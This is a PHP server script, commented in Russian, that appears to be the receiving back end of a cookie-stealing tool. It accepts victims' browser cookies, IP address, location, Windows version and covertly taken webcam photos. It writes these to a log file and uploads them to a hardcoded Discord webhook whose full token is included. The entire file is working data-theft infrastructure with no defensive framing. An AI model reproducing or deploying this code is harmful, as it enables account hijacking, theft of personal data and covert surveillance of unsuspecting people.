<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    if (isset($data['cookies'])) {
        $timestamp = date('Y-m-d H:i:s');
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        
        $content = "=== Новые данные получены ===\n";
        $content .= "Время: " . $timestamp . "\n";
        $content .= "IP Адрес: " . $ip . "\n";
        
        // Добавляем информацию о местоположении
        if (isset($data['locationInfo'])) {
            $location = $data['locationInfo'];
            $content .= "Страна: " . $location['emoji'] . " " . $location['country'] . "\n";
            $content .= "Регион: " . $location['region'] . "\n";
            $content .= "Город: " . $location['city'] . "\n";
        }
        
        // Добавляем версию Windows
        if (isset($data['windowsVersion'])) {
            $content .= "Windows: " . $data['windowsVersion'] . "\n";
        }
        
        $content .= "User Agent: " . $userAgent . "\n";
        $content .= "Cookies:\n" . $data['cookies'] . "\n\n";
        
        // Сохраняем в файл
        file_put_contents('cookies.txt', $content, FILE_APPEND);
        
        // Сохраняем фото если оно есть
        $photoName = null;
        if (isset($data['webcamPhoto']) && $data['webcamPhoto']) {
            $photoData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data['webcamPhoto']));
            $photoName = 'webcam_' . time() . '.jpg';
            file_put_contents($photoName, $photoData);
        }
        
        // Отправляем файл в Discord
        $webhookUrl = 'https://discord.com/api/webhooks/1375192857568084009/LZI_jEcNrd9wx84WYcDcl5Yv5toNXRIiKowuSSoD-TKukfgq0Y0ylGx3TH2nY1T0e7vR';
        
        // Создаем CURL запрос
        $ch = curl_init();
        
        // Подготавливаем данные для отправки
        $postData = array(
            'content' => 'Новые данные получены'
        );
        
        // Добавляем файл с куки
        if (file_exists('cookies.txt')) {
            $postData['file1'] = new CURLFile('cookies.txt', 'text/plain', 'cookies.txt');
        }
        
        // Если есть фото, добавляем его
        if ($photoName && file_exists($photoName)) {
            $postData['file2'] = new CURLFile($photoName, 'image/jpeg', 'webcam.jpg');
        }
        
        // Настраиваем CURL
        curl_setopt($ch, CURLOPT_URL, $webhookUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        // Отправляем запрос
        $response = curl_exec($ch);
        
        // Проверяем на ошибки
        if(curl_errno($ch)) {
            echo json_encode(['success' => false, 'error' => curl_error($ch)]);
        } else {
            echo json_encode(['success' => true]);
        }
        
        curl_close($ch);
        
        // Удаляем временный файл с фото
        if ($photoName && file_exists($photoName)) {
            unlink($photoName);
        }
    } else {
        echo json_encode(['success' => false, 'error' => 'No cookies data']);
    }
} else {
    echo json_encode(['success' => false, 'error' => 'Invalid request method']);
}
?> 